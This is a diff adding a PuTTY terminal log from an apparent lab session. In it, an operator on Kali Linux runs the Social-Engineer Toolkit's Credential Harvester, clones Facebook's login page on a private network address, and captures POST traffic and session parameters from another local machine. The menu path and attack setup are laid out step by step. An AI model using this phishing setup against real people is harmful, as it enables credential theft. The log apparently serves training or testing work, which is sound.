@@ -1,0 +1,428 @@
+=~=~=~=~=~=~=~=~=~=~=~= PuTTY log 2023.10.06 21:37:11 =~=~=~=~=~=~=~=~=~=~=~=
+login as: kali
+kali@192.168.0.219's password: 
+Linux kali 6.3.0-kali1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.3.7-1kali1 (2023-06-29) x86_64
+
+The programs included with the Kali GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Oct  6 20:11:37 2023 from 192.168.0.68
+                                                                                
+
+]0;kali@kali: ~ 
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[4ms[24m[4ms[24m[38;2;153;153;153mudo su[39m[24m[36ms[36mu[39m[39m[4ms[39m[4mu[39m[4mo[24m[39m [39m [39m [39m  [24m[36ms[24m[36mu[39m[24m [38;2;153;153;153mdo su[39m[39m[4ms[39m[4mu[39m[4md[24m[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m[39m [39m[4ms[24m[24m[36ms[36mu[39m[?1l>[?2004l
+[sudo] password for kali: 
+                                                                                
+
+]0;root@kali: /home/kali 
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m/home/kali[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[4ms[24m[4ms[24m[38;2;153;153;153metoolkit[39m[8D[4ms[39m[4me[24m[24m[36ms[24m[36me[36mt[39m[39m[4ms[39m[4me[39m[4mt[39m[4mo[24m[4mo[39m[4mo[24m[24m[36ms[24m[36me[24m[36mt[24m[36mo[24m[36mo[36ml[36mk[36mi[36mt[39m[1m [0m[0m [?1l>[?2004l
+[94m[1m[-] [0mNew set.config.py file generated on: 2023-10-06 20:37:27.224464
+[94m[1m[-] [0mVerifying configuration update...
+[92m[1m[*] [0mUpdate verified, config timestamp is: 2023-10-06 20:37:27.224464
+[92m[1m[*] [0mSET is using the new config, no need to restart
+[H[2J[3J[93m
+                 .--.  .--. .-----.
+                : .--': .--'`-. .-'
+                `. `. : `;    : :
+                 _`, :: :__   : :
+                `.__.'`.__.'  :_;   [0m
+[94m
+[---]        The Social-Engineer Toolkit ([93mSET[94m)         [---]
+[---]        Created by:[91m David Kennedy [94m([93mReL1K[94m)         [---]
+                      Version: [91m8.0.3[94m
+                    Codename: '[93mMaverick[0m[94m'
+[---]        Follow us on Twitter: [95m@TrustedSec[94m         [---]
+[---]        Follow me on Twitter: [95m@HackingDave[94m        [---]
+[---]       Homepage: [93mhttps://www.trustedsec.com[94m       [---]
+[92m        Welcome to the Social-Engineer Toolkit (SET).
+         The one stop shop for all of your SE needs.
+
+[1m   The Social-Engineer Toolkit is a product of TrustedSec.
+
+           Visit: [92mhttps://www.trustedsec.com
+[0m
+[94m   It's easy to update using the PenTesters Framework! (PTF)
+Visit [93mhttps://github.com/trustedsec/ptf[94m to update all your tools!
+
+[0m
+ Select from the menu:
+
+   1) Social-Engineering Attacks
+   2) Penetration Testing (Fast-Track)
+   3) Third Party Modules
+   4) Update the Social-Engineer Toolkit
+   5) Update SET configuration
+   6) Help, Credits, and About
+
+  99) Exit the Social-Engineer Toolkit
+
+[4m[36mset[0m> 1
+[H[2J[3J[91m
+           ..######..########.########
+           .##....##.##..........##...
+           .##.......##..........##...
+           ..######..######......##...
+           .......##.##..........##...
+           .##....##.##..........##...
+           ..######..########....##...  [0m
+[94m
+[---]        The Social-Engineer Toolkit ([93mSET[94m)         [---]
+[---]        Created by:[91m David Kennedy [94m([93mReL1K[94m)         [---]
+                      Version: [91m8.0.3[94m
+                    Codename: '[93mMaverick[0m[94m'
+[---]        Follow us on Twitter: [95m@TrustedSec[94m         [---]
+[---]        Follow me on Twitter: [95m@HackingDave[94m        [---]
+[---]       Homepage: [93mhttps://www.trustedsec.com[94m       [---]
+[92m        Welcome to the Social-Engineer Toolkit (SET).
+         The one stop shop for all of your SE needs.
+
+[1m   The Social-Engineer Toolkit is a product of TrustedSec.
+
+           Visit: [92mhttps://www.trustedsec.com
+[0m
+[94m   It's easy to update using the PenTesters Framework! (PTF)
+Visit [93mhttps://github.com/trustedsec/ptf[94m to update all your tools!
+
+[0m
+ Select from the menu:
+
+   1) Spear-Phishing Attack Vectors
+   2) Website Attack Vectors
+   3) Infectious Media Generator
+   4) Create a Payload and Listener
+   5) Mass Mailer Attack
+   6) Arduino-Based Attack Vector
+   7) Wireless Access Point Attack Vector
+   8) QRCode Generator Attack Vector
+   9) Powershell Attack Vectors
+  10) Third Party Modules
+
+  99) Return back to the main menu.
+
+[4m[36mset[0m> 2
+
+The Web Attack module is a unique way of utilizing multiple web-based attacks in order to compromise the intended victim.
+
+The [1mJava Applet Attack[0m method will spoof a Java Certificate and deliver a metasploit based payload. Uses a customized java applet created by Thomas Werth to deliver the payload.
+
+The [1mMetasploit Browser Exploit[0m method will utilize select Metasploit browser exploits through an iframe and deliver a Metasploit payload.
+
+The [1mCredential Harvester[0m method will utilize web cloning of a web- site that has a username and password field and harvest all the information posted to the website.
+
+The [1mTabNabbing[0m method will wait for a user to move to a different tab, then refresh the page to something different.
+
+The [1mWeb-Jacking Attack[0m method was introduced by white_sheep, emgent. This method utilizes iframe replacements to make the highlighted URL link to appear legitimate however when clicked a window pops up then is replaced with the malicious link. You can edit the link replacement settings in the set_config if its too slow/fast.
+
+The [1mMulti-Attack[0m method will add a combination of attacks through the web attack menu. For example you can utilize the Java Applet, Metasploit Browser, Credential Harvester/Tabnabbing all at once to see which is successful.
+
+The [1mHTA Attack[0m method will allow you to clone a site and perform powershell injection through HTA files which can be used for Windows-based powershell exploitation through the browser.
+
+   1) Java Applet Attack Method
+   2) Metasploit Browser Exploit Method
+   3) Credential Harvester Attack Method
+   4) Tabnabbing Attack Method
+   5) Web Jacking Attack Method
+   6) Multi-Attack Web Method
+   7) HTA Attack Method
+
+  99) Return to Main Menu
+
+[4m[36mset[0m:[4m[36mwebattack[0m>3
+
+ The first method will allow SET to import a list of pre-defined web
+ applications that it can utilize within the attack.
+
+ The second method will completely clone a website of your choosing
+ and allow you to utilize the attack vectors within the completely
+ same web application you were attempting to clone.
+
+ The third method allows you to import your own website, note that you
+ should only have an index.html when using the import website
+ functionality.
+   
+   1) Web Templates
+   2) Site Cloner
+   3) Custom Import
+
+  99) Return to Webattack Menu
+
+[4m[36mset[0m:[4m[36mwebattack[0m>2
+[94m[1m[-] [0mCredential harvester will allow you to utilize the clone capabilities within SET
+[94m[1m[-] [0mto harvest credentials or parameters from a website as well as place them into a report
+
+-------------------------------------------------------------------------------
+--- * IMPORTANT * READ THIS BEFORE ENTERING IN THE IP ADDRESS * IMPORTANT * ---
+
+The way that this works is by cloning a site and looking for form fields to
+rewrite. If the POST fields are not usual methods for posting forms this 
+could fail. If it does, you can always save the HTML, rewrite the forms to
+be standard forms and use the "IMPORT" feature. Additionally, really 
+important:
+
+If you are using an EXTERNAL IP ADDRESS, you need to place the EXTERNAL
+IP address below, not your NAT address. Additionally, if you don't know
+basic networking concepts, and you have a private IP address, you will
+need to do port forwarding to your NAT IP address from your external IP
+address. A browser doesns't know how to communicate with a private IP
+address, so if you don't specify an external IP address if you are using
+this from an external perpective, it will not work. This isn't a SET issue
+this is how networking works.
+
+[4m[36mset[0m:[4m[36mwebattack[0m> IP address for the POST back in Harvester/Tabnabbing [192.168.0.219]:
+[94m[1m[-] [0mSET supports both HTTP and HTTPS
+[94m[1m[-] [0mExample: http://www.thisisafakesite.com
+[4m[36mset[0m:[4m[36mwebattack[0m> Enter the url to clone:http://www.facebook.com
+[93m
+[*] Cloning the website: https://login.facebook.com/login.php
+[*] This could take a little bit...[0m
+[91m
+The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.[0m
+[94m[*] The Social-Engineer Toolkit Credential Harvester Attack
+[*] Credential Harvester is running on port 80
+[*] Information will be displayed to you as it arrives below:
+[0m
+192.168.0.68 - - [06/Oct/2023 20:42:55] "GET / HTTP/1.1" 200 -
+[91m[*] WE GOT A HIT! Printing the output:
+[92m
+[91mPOSSIBLE USERNAME FIELD FOUND: -----------------------------5614126142861227122860628755
+Content-Disposition: form-data; name="ts"
+
+1696639376320
+-----------------------------5614126142861227122860628755
+Content-Disposition: form-data; name="q"
+
+[{"user":"0","webSessionId":"n4nnkm:xgv4z1:p5vcvm","app_id":"256281040558","posts":[["falco:bd_pdc_signals",{"e":"{\"asid\":\"f1361544-71c0-4761-be22-71c5e5039a3b\",\"ct\":1659080345,\"sjd\":\"pFQGrc9rYs3cGMHaWc76JbdDDTmyhyWZXATS8HUDVUU9iTY/M+qgd4WFd2VhBEZG4wK5Fq3uVG5roEZ7B5oRHXyvfQC5UOvMIHRYsWc3/Wz5MrSPGtLOk1CGvF3dOTb8/ynE6GNhWZ3GBc+Pkg+FOA==\",\"sid\":-1}","r":1,"d":"$^|AcZ1cFNq5SP-J6ybWANtHfem4fLWTlbcnsrKra2Js1QjqW6T-1FFH72nGQsmKgeIUwRPFPc0yUAWBu8rp6uMsFJUnBnY|fd.AcYDFPFhU4OuVqBm0XjeBItNJ38dVff0bKTSLMVIcvYmQEsZYpNmXUq6GZweJoptyVlOKYL4ltmkKp-RH7Muu1J1","s":"n4nnkm:xgv4z1:p5vcvm","t":1696639080365.9},1696639376320,0,500]],"trigger":"falco:bd_pdc_signals"}]
+-----------------------------5614126142861227122860628755--
+[92m
+[91m[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+[0m
+192.168.0.68 - - [06/Oct/2023 20:42:56] "POST /ajax/bz?__a=1&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFuC1swgE98nwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG78b87C0yE7i0n24o5-0me2218w5uw5Uwdq0Ho2ewnE3fw5rwSyE1582ZwrU19E36w&__hs=19637.BP%3ADEFAULT.2.0..0.0&__hsi=7287009357820151023&__req=1&__rev=1009102653&__s=n4nnkm%3Axgv4z1%3Ap5vcvm&__spin_b=trunk&__spin_r=1009102653&__spin_t=1696639079&__user=0&dpr=1&jazoest=2939&lsd=AVqehbiK38U HTTP/1.1" 302 -
+[91m[*] WE GOT A HIT! Printing the output:
+[92m
+[91mPOSSIBLE USERNAME FIELD FOUND: -----------------------------330875389419232654831273413895
+Content-Disposition: form-data; name="ts"
+
+1696639377324
+-----------------------------330875389419232654831273413895
+Content-Disposition: form-data; name="q"
+
+[{"app_id":"256281040558","posts":"zCjwn1tbInJlcXVpcmVfY29uZF9leHBvc3VyZV9sb2dnaW5nIix7ImlkZW50aWZpZXIiOiJBYTM4N3hDNmpKdWgtbFZfNC1Sc2FSbS1CYzdCWkRzWnNFR1AxeHhDREljdHQzcGE3WEFIUHp3cjk4QTFJLUdmc0I0dkRYYlFmSmRtOWNJWDQ5SVFsVm8ifSwxNjk2NjM5Mzc2MzE5LDAsMTA0XSzGnwDwWDJwbzRYOUFRN1o4MGxmUGc1d3hZMmZQRjU0emxHXzcxSGlseFdOal91Tnh6c3JFT3dGa1JqUlhPeTRmajcwckVrM1o5RS1DMHJ0cVJnU3hsU3oyWHdROVk4UqMAHDhdLFsiZ2syNTlCMQGYMTA3MzUwMCIsImhhc2giOiJBVDdhSm1mbnFXeWlveE9PazJZIn0sPv4ABDUzAVq+nAHwVDF2UkRSV2Zab0UyN1dER2QyeG5uREptYWc5b0I3Z1Y5RFdQdG9COExlRlc3ZkhCcXppVHdvdzk2Y3dTSHkxeGxNNE9FaWRybHkxY2VhOUVhd3dhWndS+QAlnHL5ABQ3MDgyNTMu+ABANW40aEJMM1lUTW5RV3RBY1FKWgAENTIB+HJZABQ2NzY4MzcuWQBANE44d0JaQThjdENkSHc5X1ViWQDCUQHwWlhUY3BQQnJTX2pBekx6RUtaQjdJSmY5RWlBV05NazRURTlQdXRJV0hrZ08zbmlZMVpBTVJoczNBUXBMUWVmUUlxeHU5VjEwSTN4UkF3NmJ4TXh2Tzl5Wlk0Tnc2pQAcMjAsMCwxMTGC/wAUMTA5OTg5NlkBPGtseTJMU1pWX0RLR1JuemtKWwDWUQLwWDNENFN2NkVNQ3pGZ1JxX0F3TUtqYVJaS1F2N256UTN4SVdZX0FzQkFCWUw3YXc3enZHdzJNQTBOei03ZHozajhFeC1NRkhRSTFVWFBLRXRwZTZIeTlkaXVFSqIAADFpTvQIAWZhbGNvOmJkX3BkY19zaWduYWxzIix7ImUiOiJ7XCJhc2lkXCI6XCJmMTM2MTU0NC03MWMwLTQ3NjEtYmUyMi03MWM1ZTUwMzlhM2JcIixcImN0XCI6MTY1OTA4MDM0NSxcInNqZFwiOlwicEZRR3JjOXJZczNjR01IYVdjNzZKYmRERFRteWh5V1pYQVRTOEhVRFZVVTlpVFkvTStxZ2Q0V0ZkMlZoQkVaRzR3SzVGcTN1Vkc1cm9FWjdCNW9SSFh5dmZRQzVVT3ZNSUhSWXNXYzMvV3o1TXJTUEd0TE9rMUNHdkYzZE9UYjgveW5FNkdOaFdaM0dCYytQa2crRk9BPT1cIixcInMF6PD8LTF9IiwiciI6MSwiZCI6IiRefEFjWjFjRk5xNVNQLUo2eWJXQU50SGZlbTRmTFdUbGJjbnNyS3JhMkpzMVFqcVc2VC0xRkZINzJuR1FzbUtnZUlVd1JQRlBjMHlVQVdCdThycDZ1TXNGSlVuQm5ZfGZkLkFjWURGUEZoVTRPdVZxQm0wWGplQkl0TkozOGRWZmYwYktUU0xNVkljdlltUUVzWllwTm1YVXE2R1p3ZUpvcHR5VmxPS1lMNGx0bWtLcC1SSDdNdXUxSjEiLCJzIjoibjRubmttOnhndjR6MTpwNXZjdm0iLCJ0IjoxNjk2NjM5MDgwMzY1Ljl9LL0VKDIwLDEsNTAwXSxbTSJ0d2ViX2JsdWVfdGltZV9zcGVudF9uYXZpZ2F0aW9uXTIganNvbl9kYXRhRTc8e1xcXCJzb3VyY2VfcGF0aAEPFDpudWxsLAEKDRkQdG9rZW4BEBkaDGRlc3QZMQEcSFhXZWJMb2dpbkNvbnRyb2xsZXIBFwVIBS4ZRgEYHDk2ZTg4YWYzAQwFJDBpbXByZXNzaW9uX2lkARYFJ0AxZUxwYmxYVDVyUXloSGhtRwEaBTAQY2F1c2UBDgUoCGxvYQU1BRsYc2lkX3JhdxUdCG40bkJkAQEdBS0UcmVmZXJyCa0FSxUaBbYUZWZfcGFnCWk1GAUaCHVyaQErBTRkaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2whEgwucGhwASsIfVwi/r8C/r8C/r8C0r8CBDcwPr8CFDIsMCw2NKXeieFBvzxwZXJmX2RldmljZV9pbmZvDnYJXbkgY3B1X2NvcmVzhcAYLFwicmFtXFGTJCJncHVfcmVuZGUhy4HONEFOR0xFIChJbnRlbCwgBQeIKFIpIEhEIEdyYXBoaWNzIERpcmVjdDNEMTEgdnNfNV8wIHAFBwQpXKEpAVIUdmVuZG9yBVAoR29vZ2xlIEluYy4NVgAp/s8B/s8B/s8B2s8BBDk2Os8BHDQ4LDAsNDA3mY7+sAaSsAb0mwdCQ0xDS05KMzVUYkZXSGU1a3FtcDJVQ0huYllLcjg4YWQ4R3pKdll3RHh3SkRCV0ZaZks3UjFFYyswdlhjY2lITWtXTCszZXl1c3N1QWdsTExjOFIxTFp3ZFhlYno3bWNOeE9Vd0RGYkRqdmRNZDNWUENER2syMkJmZzZla3hHQTZDZitVK2FnZW9La1BOY2o0ZGo3b1BrUEZ6QU9PcllhY3VEYWRrZEZpdXMvWkpISEZwcmsxUHFWdm9jRXY2Mk1iM3VsV0RBRW1lR3lqZ2U3TXQrNnNqSUkwbTR0ZnFva3poTTRZWmlZNE4xNnpKRHFJZ0t2ZzZuU3paZWVTbTNWUmhoZkY2N3dFdXM5VFk5RFJIZ2wvTDg5VUNtQVFiMkwvZE0zOTQrMFRjN0VYaDNuYTNoTHJlYm5rem1ZOUJIUzQyMUZFY0VMd2JtUWZPSTlmaXZkbnEzTVJPU1ZjcmhjTGI4ZEs1d0JPcTVmVUhHTFRoZlZ1MUlWSktxUk9QWS9nc0psWmJUNExaaHpOZEw5djdydXBCekVRTGZnTWYyclpmcTRMOU5YVVNmTHp3RGFGeFN6RVNOU0lNWmFlekgwbzczcGQ5YTZvR2ZmVHBveit5cWhleGxndnkzcWRJNS9hYWdpU2lQcUo1V3M5eXNHRmtqcDdsK04rRFd4M3N4RElpYWRwZ2dZdEVyeEhJeXFnd2FONEhlVHpLb3JoVk5VZ1BXcjRxUUhpN084bzlJOUNLUklxSnRkKzhXeEprc0x5VForNlNDTVVjbTI0djNsTllJMHdyZlAybHhnZ2loSFE5RVU5VlJVbHZMZ2pFMVdqSS93V3lIYWRSdExzTzhXSjM3OGZwWmRtcFZ2SzllRDFoSHQ3bGU2RU1TeEZSQzRtR1lkUlVDaW1JU2Y2WVFCUCtCa1ZPVUNqNmRlWmlCV0dZMjQ0bG1pQ1dBSzFhM3VqU09POTlpcnY1aVVnRkROOWxaRGNidlVwUUpCSVZtTzJWM01vd3BNZngrMkZ5UTQrQWgyeGl6YmxHOWpQcUx4V1NBanpLNUlXajNQYml5akI3ajNDU0xjd0MweVlFeHBmMkpndVhCUVpkTGlsVzlCZ2RLQk41dmpRTTdpd3B2dGNnNEV6QXA0cUFmWXNIak9yeUVkc3ExNEw3Y0Z4cUVxTkU5eWRJc2ZHbFJMdEsyL1h0eUttREg2NzM1RGRzQVJlbnNDdC9uUlNaWTZLbXd0WXp2dlBFbHk0NGhIMVV2VmpTbGliQ2N5QjB5Mm02OThmaWNPRXZQQXUxMXVXRGczK1NIc2ZIZXo1bDZJODA1cjlSMTVmSnBBTUtycUkrZVg1RVRlTFBTcTRLeGdLODVtNm9JbnBGZU9CVFNhOWc0dFJ5MHYxcWFPcjk1SzArajFVVzlhMmZDRTY2dmNjOEViWk5zNGNwei9tVGRqeTRNdGJnV3Z6RXBJbXpmVHRONnhKUWx3K1VzbUVlUlg0bGFBcTdkNVlBVTFJNDdJVTRHRy9saEEyVjZMclVQZXJjcnVxN1poY1FQWEJyZ2NlaUJESzdhZzNhdnRIZFA1Zkh1RXlUSFJkWDlsVFhrZkY4aFJROFBOSkgvSzlzZE5VN2tpRUJocjR2R1hiRTZYTS9pRGIxVXFnL1JGT2Zma1FvMk9DZUhBK08vWG9aamJrSUY1TW5RMWZtS1Jkemgwcmd1Z1B6NVF6anN2MmEydDQzdGtpZjJFVzNBN3dKTkVhTDBJTk9kODRxeEtHUVhwQk5wUmF4NmswYjFNWms2N0JGeHFEUmVINlo2cW16Q0RZbWtRUXRZd1dzVUhwMHdsSVR5SGFuc3dYMEZLR1VNUGxGWVV2dmNwWkFYMHZvS2RVQWhkMHAyWXlueUtJa0d4ZG9ydmJ2U01kNkFHUzQ1dlAyRWhSaDZjWnJ3RVMvVTYycE9lZXN1ci9FWHpXYVdWeUNVOGZhd09qMDhmdzJHRHhWdnRxaG56UnAzaGZ3SHREVVAvMnRkM3pqclBMMGR4TFhDbFFzZjFLeGNhNTh1L0ErbUVROEpVUXVlbDl4Y2x0T1ljWXlEZEJiRUw4b1grbWRlU256MXZYYVd3RzVMd2tUQUFmb1lmS3o4S0hpT1pwTG9HcWZSQVhrUzJ5UUlyNjJMS0pTRUhFa0RnZG1OZ1JWQzBIYzJHZjgrMmVKQ1UyWXQ2bmw1Q21POU5EbUhBZWZ6NFVCa1FHMHlxbTdHQkVLVmpvaUtOUks3RDJBNUd2N2RCZ25kTTErRkxSRkxUenFDVGVUeE1lMmY3Q0NLVkoyS0xMNUNQYVpKK2FlaU9lZ0lvRDk1Z1FQYnhnVTRISmIwNENUemppMU1IQVVDWmFmZjBsQk1DUFFWU2tkb1FuZmhVNzhWdFBSNW9jZ0VtcGlVVGFhNXB4cW1VWGMrZ3JlaVgveEkxQVNHSzBLRVBicFBIRWovZWZ5OHhHNDg1YnJsYisyNzJjMlVRbExpWHZaalR2VnpwUXZLbEZnS2FndE5zOFFQUlhyVzZhTG0xU3RoVmxjU1JaVkI3TisrUndNL2tcIixcInNpZFwiOi0xfSIsInIiOjEsImQiOiIk/pgN/pgN/pgNlpgNBDk5OgoJKDUxLDAsMjI2OF1d","user":"0","webSessionId":"n4nnkm:xgv4z1:p5vcvm","trigger":"falco:web_blue_time_spent_navigation","send_method":"ajax","compression":"snappy_base64","snappy_ms":1}]
+-----------------------------330875389419232654831273413895--
+[92m
+[91m[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+[0m
+192.168.0.68 - - [06/Oct/2023 20:42:57] "POST /ajax/bz?__a=1&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFuC1swgE98nwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG78b87C0yE7i0n24o5-0me2218w5uw5Uwdq0Ho2ewnE3fw5rwSyE1582ZwrU19E36w&__hs=19637.BP%3ADEFAULT.2.0..0.0&__hsi=7287009357820151023&__req=2&__rev=1009102653&__s=n4nnkm%3Axgv4z1%3Ap5vcvm&__spin_b=trunk&__spin_r=1009102653&__spin_t=1696639079&__user=0&dpr=1&jazoest=2939&lsd=AVqehbiK38U HTTP/1.1" 302 -
+[91m[*] WE GOT A HIT! Printing the output:
+[92m
+[91mPOSSIBLE USERNAME FIELD FOUND: -----------------------------234284069730936992131912701726
+Content-Disposition: form-data; name="ts"
+
+1696639385386
+-----------------------------234284069730936992131912701726
+Content-Disposition: form-data; name="q"
+
+[{"app_id":"256281040558","posts":"zBLwaVtbImZhbGNvOmJkX3BkY19zaWduYWxzIix7ImUiOiJ7XCJhc2lkXCI6XCJmMTM2MTU0NC03MWMwLTQ3NjEtYmUyMi03MWM1ZTUwMzlhM2JcIixcImN0XCI6MTY1OTA4MDM0NSxcInNqZFwBQ/CccEZRR3JjOXJZczNjR01IYVdjNzZKYmRERFRteWh5V1pYQVRTOEhVRFZVVTlpVFkvTStxZ2Q0V0ZkMlZoQkVaRzR3SzVGcTN1Vkc1cm9FWjdCNW9SSFh5dmZRQzVVT3ZNSUhSWXNXYzMvV3o1TXJTUEd0TE9rMUNHdkYzZE9UYjgveW5FNkdOaFdaM0dCYytQa2crRk9BPT1cIixcIgno9BQBLTF9IiwiciI6MSwiZCI6IiRefEFjWjFjRk5xNVNQLUo2eWJXQU50SGZlbTRmTFdUbGJjbnNyS3JhMkpzMVFqcVc2VC0xRkZINzJuR1FzbUtnZUlVd1JQRlBjMHlVQVdCdThycDZ1TXNGSlVuQm5ZfGZkLkFjWURGUEZoVTRPdVZxQm0wWGplQkl0TkozOGRWZmYwYktUU0xNVkljdlltUUVzWllwTm1YVXE2R1p3ZUpvcHR5VmxPS1lMNGx0bWtLcC1SSDdNdXUxSjEiLCJzIjoibjRubmttOnhndjR6MTpwNXZjdm0iLCJ0IjoxNjk2NjM5MDgwMzY1Ljl9LDE2OTY2MzkzNzYzMjAsMiw1MDBdLFsiZkUiMG9kc193ZWJfYmF0Y2hdIQUQJFwiOntcIjEzNDQJCgBmATMYLmV2ZW50LjZbAgguQzMJIwRqcw0gbHdyaXRlX3RvX3F1ZXVlXCI6WzIsbnVsbF19LFwNSSRmYWJyaWMud3d3jj8AADQJP3AsXCJqcy51c2VfYmFuemFpLmxvZ19jcml0aWNhbAFnADEuKAANJAxwb3N0aikAFHBsYW5lcxEtFbocdHJhbnNwb3JB+nJ/AChpbW1lZGlhdGVseYKCAG4sADbWAAFLLTQJ9TrNAB0gOVROnQE1mjZgAJI2AQxpbmdfBVQdbgmONk0AAR8tej6NAEVfZGx1ZV90aW1lX3NwZW50X25hdmlnYXRpb25cRWRG0wFuKAE9CTKgANKBAI58AmpZAEhwZXJmX2RldmljZV9pbmZvX2xvIQ0Ae0qnAj0kKUPKyABObwCuwgAhnQwyOTY2KXcIbXMuOZUILnFhYYwJGh0XRGJpdHMuanNfaW5pdGlhbGl6ZcE7NRQEfX3+XAX+XAX+XAXKXAUMNTM2Ni5cBTA4MTMxOCwwLDEzMjddtV1B+jlJJF9iaXRfYXJyYXm9aBRzaWRfcmEhdRBcIm40bkLUBeV8EHN0YXJ0BUoAXOGEBDk2qc8ULFwidG9zCVMcXCI6WzExLDBBWgEVGGN1bVwiOjMNIwBpIbIIXCJwxScEXCINFgRsZWF+ADkNDhhzZXFcIjow/s0B/s0B/s0Bys0BCDg0MjbNASw0Mzc5LDAsNDA0XV0=","user":"0","webSessionId":"n4nnkm:xgv4z1:p5vcvm","trigger":"falco:web_time_spent_bit_array","send_method":"ajax","compression":"snappy_base64","snappy_ms":1}]
+-----------------------------234284069730936992131912701726--
+[92m
+[91m[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+[0m
+192.168.0.68 - - [06/Oct/2023 20:43:05] "POST /ajax/bz?__a=1&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFuC1swgE98nwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG78b87C0yE7i0n24o5-0me2218w5uw5Uwdq0Ho2ewnE3fw5rwSyE1582ZwrU19E36w&__hs=19637.BP%3ADEFAULT.2.0..0.0&__hsi=7287009357820151023&__req=3&__rev=1009102653&__s=n4nnkm%3Axgv4z1%3Ap5vcvm&__spin_b=trunk&__spin_r=1009102653&__spin_t=1696639079&__user=0&dpr=1&jazoest=2939&lsd=AVqehbiK38U HTTP/1.1" 302 -
+[91m[*] WE GOT A HIT! Printing the output:
+[92m
+[91mPOSSIBLE USERNAME FIELD FOUND: -----------------------------393666427430394702444166269380
+Content-Disposition: form-data; name="ts"
+
+1696639406322
+-----------------------------393666427430394702444166269380
+Content-Disposition: form-data; name="q"
+
+[{"user":"0","webSessionId":"n4nnkm:xgv4z1:p5vcvm","app_id":"256281040558","posts":[["falco:bd_pdc_signals",{"e":"{\"asid\":\"f1361544-71c0-4761-be22-71c5e5039a3b\",\"ct\":1659080345,\"sjd\":\"pFQGrc9rYs3cGMHaWc76JcwpP/7vxCvI3jvsgLDU70CWxW8PPgVQfH+8EFhzgVhpykj6QRc7b+uIr/PkHGnCkIfabFtYQPhyvN8JwvwhxDpSRO5uH12dHL9GgBy/FUB0233nUgDuAM8QjRWeFDBenw==\",\"sid\":-1}","r":1,"d":"$^|AcZ1cFNq5SP-J6ybWANtHfem4fLWTlbcnsrKra2Js1QjqW6T-1FFH72nGQsmKgeIUwRPFPc0yUAWBu8rp6uMsFJUnBnY|fd.AcYDFPFhU4OuVqBm0XjeBItNJ38dVff0bKTSLMVIcvYmQEsZYpNmXUq6GZweJoptyVlOKYL4ltmkKp-RH7Muu1J1","s":"n4nnkm:xgv4z1:p5vcvm","t":1696639110370.9},1696639406322,0,500]],"trigger":"falco:bd_pdc_signals"}]
+-----------------------------393666427430394702444166269380--
+[92m
+[91m[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+[0m
+192.168.0.68 - - [06/Oct/2023 20:43:26] "POST /ajax/bz?__a=1&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFuC1swgE98nwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG78b87C0yE7i0n24o5-0me2218w5uw5Uwdq0Ho2ewnE3fw5rwSyE1582ZwrU19E36w&__hs=19637.BP%3ADEFAULT.2.0..0.0&__hsi=7287009357820151023&__req=4&__rev=1009102653&__s=n4nnkm%3Axgv4z1%3Ap5vcvm&__spin_b=trunk&__spin_r=1009102653&__spin_t=1696639079&__user=0&dpr=1&jazoest=2939&lsd=AVqehbiK38U HTTP/1.1" 302 -
+[91m[*] WE GOT A HIT! Printing the output:
+[92m
+PARAM: local_storage[hb_timestamp]=13
+PARAM: local_storage[Session]=20
+PARAM: local_storage[signal_flush_timestamp]=13
+PARAM: session_storage[TabId]=6
+PARAM: session_storage[sp_pi]=216
+PARAM: logtime=1
+[91mPOSSIBLE USERNAME FIELD FOUND: __user=0
+[92m
+PARAM: __a=1
+PARAM: __req=5
+PARAM: __hs=19637.BP:DEFAULT.2.0..0.0
+PARAM: dpr=1
+PARAM: __ccg=EXCELLENT
+PARAM: __rev=1009102653
+PARAM: __s=n4nnkm:xgv4z1:p5vcvm
+PARAM: __hsi=7287009357820151023
+PARAM: __dyn=7xe6E5aQ1PyUbFuC1swgE98nwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG78b87C0yE7i0n24o5-0me2218w5uw5Uwdq0Ho2ewnE3fw5rwSyE1582ZwrU19E36w
+PARAM: __csr=
+PARAM: lsd=AVqehbiK38U
+PARAM: jazoest=2939
+[91mPOSSIBLE PASSWORD FIELD FOUND: __spin_r=1009102653
+[92m
+[91mPOSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk
+[92m
+[91mPOSSIBLE PASSWORD FIELD FOUND: __spin_t=1696639079
+[92m
+[91m[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+[0m
+192.168.0.68 - - [06/Oct/2023 20:43:56] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
+[91m[*] WE GOT A HIT! Printing the output:
+[92m
+PARAM: local_storage[hb_timestamp]=13
+PARAM: local_storage[Session]=20
+PARAM: local_storage[signal_flush_timestamp]=13
+PARAM: session_storage[TabId]=6
+PARAM: session_storage[sp_pi]=216
+PARAM: logtime=1
+[91mPOSSIBLE USERNAME FIELD FOUND: __user=0
+[92m
+PARAM: __a=1
+PARAM: __req=6
+PARAM: __hs=19637.BP:DEFAULT.2.0..0.0
+PARAM: dpr=1
+PARAM: __ccg=EXCELLENT
